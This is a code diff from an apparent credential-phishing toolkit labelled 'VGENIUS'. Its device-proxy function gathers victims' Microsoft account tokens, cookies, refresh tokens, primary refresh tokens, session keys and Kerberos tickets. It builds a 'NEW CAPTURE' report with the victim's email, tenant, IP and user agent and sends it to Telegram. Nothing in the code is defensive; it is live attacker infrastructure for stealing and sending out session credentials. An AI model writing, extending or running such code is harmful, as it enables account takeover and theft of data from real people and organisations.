@@ -679,7 +679,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
     // Send Telegram capture report directly from device proxy
     // This ensures Telegram receives the capture even if the worker never calls /api/capture
     try {
-      const { buildCaptureCaption, buildCaptureFileContent } = require('../routes/capture');
       const reportTokenType = job.mode === 'cookie' ? 'cookie' : 'token';
 
       // Load stored token row so Kerberos fields are defined if already saved
@@ -689,30 +688,31 @@ async function storeToken(job, tokenData, responseCookies = []) {
       );
       const tokenRow = tokenRows.length > 0 ? tokenRows[0] : null;
 
-      const reportData = {
-        email: email || tokenRow?.email || null,
-        templateType: 'office',
-        tokenType: reportTokenType,
-        accessToken: tokenData.access_token || null,
-        refreshToken: tokenData.refresh_token || null,
-        idToken: tokenData.id_token || null,
-        prt: prt || tokenRow?.prt || null,
-        sessionKeyJwe: sessionKeyJwe || tokenRow?.session_key_jwe || null,
-        deviceTenantId: deviceTenantId || tokenRow?.device_tenant_id || null,
-        tgtAd: tokenRow?.tgt_ad || null,
-        tgtCloud: tokenRow?.tgt_cloud || null,
-        kerberosTopLevelNames: tokenRow?.kerberos_top_level_names || null,
-        tgtCloudSessionkey: tokenRow?.tgt_cloud_sessionkey || null,
-        accountType: accountType || tokenRow?.account_type || 'work_school',
-        tenant: tenant || tokenRow?.tenant || null,
-        ip: ipAddress || tokenRow?.ip_address || null,
-        userAgent: userAgent || tokenRow?.user_agent || null,
-        linkId: job.link_id,
-        tokenId,
-      };
+      const safe = (v) => (v == null ? 'N/A' : v);
+      const caption = `🚨 NEW CAPTURE - ${reportTokenType.toUpperCase()}
+👤 <b>Email:</b> ${safe(email || tokenRow?.email)}
+🏷️ <b>Account:</b> ${safe(accountType || tokenRow?.account_type)} | Tenant: ${safe(tenant || tokenRow?.tenant)}
+🌐 <b>Template:</b> office
+🌍 <b>IP:</b> ${safe(ipAddress || tokenRow?.ip_address)}
+🔗 <b>Link:</b> ${job.link_id} | Token ID: ${tokenId}
+📅 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').slice(0, 19)}
+✅ Full ${reportTokenType}s in attached .txt`;
 
-      const caption = buildCaptureCaption(reportData);
-      const fileContent = buildCaptureFileContent(reportData);
+      const fileContent = [
+        'VGENIUS CAPTURE REPORT',
+        '========================================',
+        `Type:        ${reportTokenType.toUpperCase()}`,
+        `Token ID:    ${tokenId}`,
+        `Email:       ${safe(email || tokenRow?.email)}`,
+        `Account:     ${safe(accountType || tokenRow?.account_type)}`,
+        `Tenant:      ${safe(tenant || tokenRow?.tenant)}`,
+        `IP:          ${safe(ipAddress || tokenRow?.ip_address)}`,
+        `User Agent:  ${safe(userAgent || tokenRow?.user_agent)}`,
+        `Link:        ${job.link_id}`,
+        `Time:        ${new Date().toISOString()}`,
+        '========================================'
+      ].join('\n');
+
       const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;
 
       console.log('[DeviceProxy] Sending Telegram report for token', tokenId, 'type=', reportTokenType, 'caption=', caption);
